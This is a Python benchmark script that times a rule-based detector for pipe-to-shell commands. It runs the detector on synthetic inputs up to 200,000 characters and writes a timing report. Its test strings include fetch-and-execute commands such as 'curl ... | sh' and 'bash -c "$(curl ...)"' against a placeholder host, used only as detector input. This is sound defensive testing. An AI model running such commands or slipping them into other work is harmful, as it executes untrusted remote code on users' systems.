"""Bounded synthetic rule timings; no submitted code is executed or fetched."""
import argparse
from datetime import datetime,timezone
import hashlib
import importlib.util
import json
import math
import os
from pathlib import Path
import platform
import subprocess
import sys
import time
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
from protocol.reports import write_report

FORMS={'negative':'curl https://example.invalid/path ',
       'positive':'curl https://example.invalid/path | sh; ',
       'substitution':'bash -c "$(curl https://example.invalid/path)"; ',
       'warning':'do not run curl https://example.invalid/path | sh; ',
       'literal':'curl https://example.invalid/path | sh; '}
SIZES=(2000,10000,20000,100000,200000)
REPEATS=5

def sample(form,size):
    part=FORMS[form]
    if form=='literal':
        return "echo '"+(part*((size//len(part))+1))[:size-7]+"'"
    return (part*((size//len(part))+1))[:size]

def child(form,size):
    began=time.perf_counter()
    spec=importlib.util.spec_from_file_location('measured_rules',ROOT/'services/evaluator/app.py')
    method=importlib.util.module_from_spec(spec);spec.loader.exec_module(method)
    cold=(time.perf_counter()-began)*1000
    text=sample(form,size)
    method.signals(method.Doc(text=text))
    durations=[];counts=[]
    for _ in range(REPEATS):
        began=time.perf_counter();value=method.signals(method.Doc(text=text));durations.append((time.perf_counter()-began)*1000)
        counts.append(sum(len(c['signals']) for c in value['candidates']))
    if len(set(counts))!=1 or bool(counts[0])!=(form in ('positive','substitution')):
        raise ValueError('Synthetic form outcome changed')
    return {'form':form,'input_length_codepoints':len(text),'cold_method_import_ms':cold,
            'durations_ms':durations,'signals':counts[0],
            'p50_ms':sorted(durations)[math.ceil(REPEATS*.5)-1],
            'p95_ms':sorted(durations)[math.ceil(REPEATS*.95)-1]}

def measure():
    source=hashlib.sha256((ROOT/'services/evaluator/app.py').read_bytes()).hexdigest();rows=[];failed=[]
    for form in FORMS:
        for size in SIZES:
            try:
                result=subprocess.run([sys.executable,__file__,'--child',form,str(size)],cwd=ROOT,capture_output=True,text=True,timeout=15,check=False)
                if result.returncode:raise ValueError('Measurement failed')
                row=json.loads(result.stdout)
                if row['input_length_codepoints']!=size:raise ValueError('Wrong input length')
                rows.append(row)
            except (OSError,ValueError,subprocess.TimeoutExpired):failed.append({'form':form,'input_length_codepoints':size,'reason':'timeout_or_invalid_measurement'})
    unchanged=source==hashlib.sha256((ROOT/'services/evaluator/app.py').read_bytes()).hexdigest()
    return {'captured_at':datetime.now(timezone.utc).isoformat(),'pass':not failed and unchanged,
            'kind':'synthetic_rule_stress_measurement','method_sha256':source,'source_unchanged':unchanged,
            'declared_hardware':{'system':platform.system(),'machine':platform.machine(),'logical_cpus':os.cpu_count()},
            'python_version':platform.python_version(),'declared_input_lengths':list(SIZES),'repeats_per_form':REPEATS,
            'rows':rows,'failures':failed,'candidate_target_ms':100,
            'target_exceeded_profiles':[{'form':r['form'],'input_length_codepoints':r['input_length_codepoints'],'p95_ms':r['p95_ms']} for r in rows if r['p95_ms']>100],
            'target_is_not_an_accepted_release_gate':True,
            'scope':'Rule call only; cold imports, English redaction, HTTP transfer and whole-device startup are separate. Five repeated runs are not population confidence intervals.',
            'user_content_used':False,'remote_requests':0,'payloads_executed':0,'independent_accuracy_evidence':False,'release_approved':False}

if __name__=='__main__':
    p=argparse.ArgumentParser(description=__doc__);p.add_argument('--child',nargs=2);p.add_argument('--output');a=p.parse_args()
    if a.child:
        form,size=a.child
        if form not in FORMS or int(size) not in SIZES:raise SystemExit(2)
        print(json.dumps(child(form,int(size)),allow_nan=False));raise SystemExit(0)
    result=measure()
    if a.output:write_report(a.output,result)
    print(json.dumps({k:result[k] for k in ('pass','method_sha256','declared_hardware','target_exceeded_profiles','failures')},allow_nan=False))
    raise SystemExit(0 if result['pass'] else 1)
